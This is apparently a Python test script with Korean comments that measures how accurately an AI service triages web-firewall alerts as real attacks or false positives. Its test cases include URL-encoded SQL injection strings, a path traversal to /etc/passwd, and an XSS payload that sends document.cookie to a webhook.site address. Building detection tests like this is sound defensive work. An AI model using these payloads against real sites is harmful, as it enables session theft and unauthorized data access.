"""AI 정/오탐 판별 PoC 검증 스크립트.

알려진 정탐(실제 공격) + 알려진 오탐(정상 트래픽)을 섞어 AI에 넣고,
사람이 미리 라벨링한 정답(expected)과 AI 판정이 일치하는지 측정한다.

실행:  python test_triage.py
"""
import sys

from triage_service import triage_service

# (라벨, 경보) — expected는 사람이 판단한 정답
TEST_CASES = [
    # ── 정탐(실제 공격) — 분석플랫폼 실제 로그에서 발췌 ──
    ("정탐", {
        "signature": "SQL Injection", "src_ip": "10.44.44.44", "dest_ip": "10.0.10.2",
        "source": "modsec", "severity": "3",
        "uri": "/concert/list.do?keyword=%27%20AND%201%3D2%20AND%20%27%27%3D%27",
    }),
    ("정탐", {
        "signature": "SQL Injection", "src_ip": "10.44.44.44", "dest_ip": "10.0.10.2",
        "source": "modsec", "severity": "3",
        "uri": "/concert/list.do?keyword=bts&status=x%27%20AND%201=CTXSYS.DRITHSX.SN(1,(SELECT%20user%20FROM%20dual))%20AND%20%27x%27=%27x",
    }),
    ("정탐", {
        "signature": "XSS", "src_ip": "10.44.44.44", "dest_ip": "10.0.10.2",
        "source": "modsec", "severity": "3",
        "uri": "/concert/list.do?keyword=%22%3E%3Cimg+src%3Dx+onerror%3D%22fetch%28%27https%3A%2F%2Fwebhook.site%2Fxxx%2Fc%3Fk%3D%27%2Bdocument.cookie%29%22%3E",
    }),
    ("정탐", {
        "signature": "Path Traversal", "src_ip": "10.44.44.44", "dest_ip": "10.0.10.2",
        "source": "modsec", "severity": "3",
        "uri": "/qna/downloadFile.do?fileName=../../../../../../../../../../etc/passwd",
    }),

    # ── 오탐(정상 트래픽) — 시그니처는 매칭되나 실제로는 정상 ──
    ("오탐", {
        "signature": "Command Injection", "src_ip": "10.20.30.40", "dest_ip": "10.0.10.2",
        "source": "modsec", "severity": "3",
        "uri": "/concert/listJson.do;jsessionid=A1B2C3D4E5F6789012345678",
    }),
    ("오탐", {
        "signature": "SQL Injection", "src_ip": "10.20.30.41", "dest_ip": "10.0.10.2",
        "source": "modsec", "severity": "3",
        "uri": "/concert/list.do?keyword=%EC%BD%98%EC%84%9C%ED%8A%B8&status=open",  # keyword=콘서트
    }),
    ("오탐", {
        "signature": "XSS", "src_ip": "10.20.30.42", "dest_ip": "10.0.10.2",
        "source": "modsec", "severity": "2",
        "uri": "/faq/selectFaqList.do?page=1&size=10",
    }),
]


def main() -> int:
    print("=" * 70)
    print(" AI 정/오탐 판별 PoC — 검증 시작")
    print("=" * 70)

    correct = 0
    for i, (expected, alert) in enumerate(TEST_CASES, 1):
        print(f"\n[{i}/{len(TEST_CASES)}] {alert['signature']}  ←  정답: {expected}")
        print(f"  URI: {alert['uri'][:90]}")
        try:
            r = triage_service.classify(alert)
        except Exception as e:
            print(f"  ❌ 호출 실패: {e}")
            continue

        verdict = r.get("verdict", "?")
        hit = verdict.startswith(expected)
        correct += hit
        mark = "✅" if hit else "❌"
        print(f"  {mark} AI 판정: {verdict} (신뢰도 {r.get('confidence')}%) — {r.get('attack_type')}")
        print(f"     근거: {r.get('reasoning')}")
        if r.get("indicators"):
            print(f"     지표: {r.get('indicators')}")

    acc = correct / len(TEST_CASES) * 100
    print("\n" + "=" * 70)
    print(f" 결과: {correct}/{len(TEST_CASES)} 정확 ({acc:.0f}%)")
    print("=" * 70)
    return 0 if correct == len(TEST_CASES) else 1


if __name__ == "__main__":
    sys.exit(main())
